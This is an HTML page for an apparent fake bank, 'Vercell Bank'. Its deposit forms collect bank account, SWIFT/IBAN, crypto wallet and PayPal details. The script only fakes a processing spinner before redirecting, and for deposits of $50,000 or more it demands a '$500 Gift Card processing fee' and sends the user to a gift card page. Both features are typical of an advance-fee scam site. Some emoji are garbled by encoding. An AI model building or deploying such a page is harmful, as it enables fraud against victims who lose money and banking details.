<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Deposit - Vercell Bank</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0f172a;
      color: #f8fafc;
    }

    .container {
      max-width: 800px;
      margin: auto;
      background-color: #1e293b;
      padding: 25px;
      border-radius: 10px;
      border: 1px solid #334155;
    }

    h2 {
      text-align: center;
      color: #3b82f6;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input, select {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 15px;
      background-color: #0f172a;
      color: #f8fafc;
      border: 1px solid #334155;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #2563eb;
    }

    .method-box {
      margin-bottom: 30px;
      padding: 20px;
      border: 1px solid #334155;
      border-radius: 8px;
      background-color: #0f172a;
    }

    .note {
      font-size: 0.85rem;
      color: #94a3b8;
      margin-top: 10px;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #22c55e;
      border-top: 4px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    #spinnerBox {
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Deposit Funds</h2>

    <!-- Spinner -->
    <div id="spinnerBox">
      <div class="spinner"></div>
      <p style="color:#22c55e; font-weight:bold;">‚≠ò Processing deposit...</p>
    </div>

    <!-- Bank Deposit -->
    <div class="method-box">
      <h3>üè¶ Bank Transfer</h3>
      <form onsubmit="return handleDeposit(event, 'bankAmount')">
        <label>Amount ($)</label>
        <input type="number" id="bankAmount" required>
        <label>Bank Name</label>
        <input type="text" required>
        <label>Account Number</label>
        <input type="text" required>
        <label>SWIFT/IBAN Code</label>
        <input type="text" required>
        <button type="submit">Submit Bank Deposit</button>
      </form>
    </div>

    <!-- Bitcoin -->
    <div class="method-box">
      <h3>‚Çø Bitcoin</h3>
      <form onsubmit="return handleDeposit(event, 'btcAmount')">
        <label>Amount ($)</label>
        <input type="number" id="btcAmount" required>
        <label>Sender Wallet Address</label>
        <input type="text" required>
        <button type="submit">Submit Bitcoin Deposit</button>
      </form>
    </div>

    <!-- USDT -->
    <div class="method-box">
      <h3>üí± USDT (TRC20)</h3>
      <form onsubmit="return handleDeposit(event, 'usdtAmount')">
        <label>Amount ($)</label>
        <input type="number" id="usdtAmount" required>
        <label>Sender TRC20 Wallet</label>
        <input type="text" required>
        <button type="submit">Submit USDT Deposit</button>
      </form>
    </div>

    <!-- PayPal -->
    <div class="method-box">
      <h3>üí∏ PayPal</h3>
      <form onsubmit="return handleDeposit(event, 'paypalAmount')">
        <label>Amount ($)</label>
        <input type="number" id="paypalAmount" required>
        <label>PayPal Email</label>
        <input type="email" required>
        <button type="submit">Submit PayPal Deposit</button>
      </form>
    </div>

    <p class="note">‚ö†Ô∏è Deposits above $50,000 require a $500 Gift Card fee and will redirect for verification.</p>
  </div>

  <script>
    function handleDeposit(e, amountId) {
      e.preventDefault();

      const amount = parseFloat(document.getElementById(amountId).value);
      const spinnerBox = document.getElementById("spinnerBox");

      spinnerBox.style.display = "block";

      setTimeout(() => {
        spinnerBox.style.display = "none";

        if (amount >= 50000) {
          alert("‚ö†Ô∏è A $500 Gift Card processing fee is required for this deposit.\nRedirecting to giftcard.html...");
          window.location.href = "giftcard.html";
        } else {
          alert("‚úÖ Deposit submitted successfully!");
          window.location.href = "dashboard.html";
        }
      }, 5000);
      return false;
    }
  </script>

</body>
</html>
